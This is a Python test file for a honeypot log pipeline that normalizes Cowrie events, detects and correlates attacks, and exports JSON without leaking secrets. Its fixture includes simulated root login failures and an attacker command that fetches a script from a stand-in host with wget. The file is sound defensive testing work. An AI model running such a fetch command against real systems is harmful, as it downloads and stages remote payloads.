import json
from datetime import datetime, timedelta, timezone

from src.correlation.correlator import IncidentCorrelator
from src.correlation.export import (
    detection_to_dict,
    export_json,
    export_results,
    incident_to_dict,
)
from src.detection.engine import DetectionEngine
from src.normalization.normalize import normalize_event

NOW = datetime(2026, 11, 8, 12, 0, tzinfo=timezone.utc)


def pipeline():
    raws = [
        {"eventid": "cowrie.login.failed", "timestamp": f"2026-10-28T10:00:{i:02d}Z",
         "session": "real-1", "src_ip": "10.0.0.9", "username": "root",
         "password": "example-secret"}
        for i in range(5)
    ]
    raws.append({"eventid": "cowrie.command.input", "timestamp": "2026-10-28T10:01:00Z",
                 "session": "real-1", "src_ip": "10.0.0.9",
                 "input": "wget http://evil.example/p.sh"})
    events = [normalize_event(r) for r in raws]
    detections = DetectionEngine().analyze(events, now=NOW)
    incidents = IncidentCorrelator().correlate(detections, events, now=NOW)
    return detections, incidents


def test_export_is_valid_json_with_expected_keys():
    detections, incidents = pipeline()
    data = json.loads(export_json(detections, incidents))
    assert set(data) == {"detections", "incidents"}
    assert len(data["incidents"]) == 1
    incident = data["incidents"][0]
    for key in ("incident_id", "title", "summary", "severity", "status",
                "created_at", "updated_at", "detection_ids", "event_ids", "timeline"):
        assert key in incident


def test_export_contains_no_secret_or_command_text():
    text = export_json(*pipeline())
    assert "example-secret" not in text
    assert "evil.example" not in text


def test_export_is_deterministic():
    detections, incidents = pipeline()
    a = export_json(detections, incidents)
    b = export_json(list(reversed(detections)), list(reversed(incidents)))
    assert a == b


def test_timestamps_are_iso_strings():
    detections, incidents = pipeline()
    data = export_results(detections, incidents)
    assert data["incidents"][0]["created_at"] == NOW.isoformat()
    assert all(isinstance(e["timestamp"], str) for e in data["incidents"][0]["timeline"])


def test_references_are_consistent():
    detections, incidents = pipeline()
    data = export_results(detections, incidents)
    detection_ids = {d["detection_id"] for d in data["detections"]}
    incident = data["incidents"][0]
    assert set(incident["detection_ids"]) <= detection_ids
    assert incident["event_ids"] == [e["event_id"] for e in incident["timeline"]]


def test_empty_export():
    assert export_results([], []) == {"detections": [], "incidents": []}


def test_single_converters_return_plain_types():
    detections, incidents = pipeline()
    json.dumps(detection_to_dict(detections[0]))
    json.dumps(incident_to_dict(incidents[0]))

def test_detections_carry_detector_version_and_ids_do_not_depend_on_it():
    from src.detection.engine import DETECTOR_VERSION, _detection_id

    detections, _ = pipeline()
    data = export_results(detections, [])
    assert data["detections"]
    assert all(d["detector_version"] == DETECTOR_VERSION for d in data["detections"])

    # L'identifiant est calculé uniquement à partir de la règle et des événements.
    for d in detections:
        assert d.detection_id == _detection_id(d.rule_id, d.source_event_ids)    